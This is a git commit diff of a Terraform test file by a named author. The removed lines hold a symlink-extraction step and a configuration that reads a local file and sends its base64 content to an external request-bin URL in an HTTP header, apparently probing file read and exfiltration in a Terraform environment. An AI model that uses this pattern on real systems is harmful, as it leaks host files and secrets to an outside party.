9527e170671d2b8e5000a2e0ce7b310fd717e710
Manuel Wudka-Robles <mwudka@gmail.com>
2020-07-30 15:28:49 -0700

    Change

--- test.tf
+++ test.tf
@@ -1,30 +1,8 @@
-# terraform {
-#   backend "remote" {
-#     hostname = "tfe-zone-60f6da41.ngrok.io"
-#     organization = "hashicorp_v2"
+//--------------------------------------------------------------------
+// Modules
+module "animal" {
+  source  = "tfe-zone-60f6da41.ngrok.io/otherorg/animal/demo"
+  version = "1.0.0"
 
-#     workspaces {
-#       name = "my-tfe"
-#     }
-#   }
-# }
-
-# resource 
-
-# resource "null" "local-exec" {
-#   provisioner "local-exec" {
-#     command = "tar -xvzf ${path.module}/etc-symlink.tar.gz ${path.module}/etc-symlink"
-#   }
-# }
-
-data "local_file" "symlink" {
-  filename = "${path.module}/cpuinfo"
-}
-
-data "http" "example" {
-  url = "https://en2jtsznfuiex.x.pipedream.net"
-
-  request_headers = {
-    XTestContent = "${data.local_file.symlink.content_base64}"
-  }
+  name = "testing"
 }
